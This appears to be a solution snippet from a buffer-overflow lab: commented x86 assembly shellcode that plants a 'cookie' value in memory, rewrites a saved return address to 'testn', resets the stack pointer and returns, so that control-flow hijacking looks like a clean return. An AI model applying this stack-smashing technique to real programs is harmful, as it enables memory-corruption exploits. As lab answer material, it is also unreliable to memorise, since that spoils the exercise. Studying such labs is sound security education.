movl $0x19233537, %ebx #cookie to ebx
movl %ebx, 0x55682f64 #ebx to val (memaddr:0x55682f64)
movl $0x8048e65, %ebx #returning address to testn to ebx
movl %ebx, 0x55682f44 #store returning address in stack mem
movl $0, %ebx # restore ebx value
movl $0x55682f44,%esp # stack pointer register points exact add
ret
